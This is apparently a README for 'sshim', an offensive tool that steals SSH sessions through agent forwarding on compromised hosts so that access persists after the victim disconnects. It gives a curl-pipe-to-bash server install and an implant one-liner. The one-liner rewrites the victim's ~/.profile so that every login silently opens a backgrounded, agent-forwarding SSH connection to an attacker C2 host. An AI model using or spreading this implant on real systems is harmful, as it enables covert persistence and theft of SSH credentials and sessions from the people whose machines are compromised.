# sshim
SSHim - Shimming SSH as him

Steal SSH sessions from agent forwarding on a compromised host, enabling peristent access after agent disconnect


## Server Install

```bash
curl -fsSL https://raw.githubusercontent.com/B00TK1D/sshim/main/install.sh | bash
```



## Implant

```bash
 SERVER="your.c2.com" cat <(echo "ssh -A ssh@$SERVER >/dev/null 2>&1 & disown") ~/.profile > /tmp/.profile && mv /tmp/.profile ~/.profile
```
